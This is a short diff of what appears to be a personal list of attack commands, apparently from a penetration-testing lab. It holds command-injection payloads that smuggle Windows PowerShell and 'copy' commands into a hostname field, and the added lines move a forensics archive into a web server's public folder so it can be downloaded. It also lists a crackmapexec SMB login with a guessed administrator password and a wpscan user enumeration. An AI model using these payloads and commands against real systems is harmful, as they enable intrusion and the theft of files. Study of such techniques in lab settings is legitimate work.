@@ -88,3 +88,8 @@ hostname=127.0.0.1 & powershell -command "Expand-Archive -Path C:\Users\nebula\D
 crackmapexec smb 192.168.1.164 -u administrator -p password
 
 wpscan --url http://derpnstink.local/weblog/ --enumerate u
+
+
+hostname=127.0.0.1 & copy "C:\Users\nebula\Desktop\forensics_artefacts.zip" "C:\xampp\htdocs\fa.zip"&command=tracert  
+
+hostname=127.0.0.1 & copy C:\Users\nebula\Desktop\forensics_artefacts.zip C:\xampp\htdocs\fa.zip &command=tracert
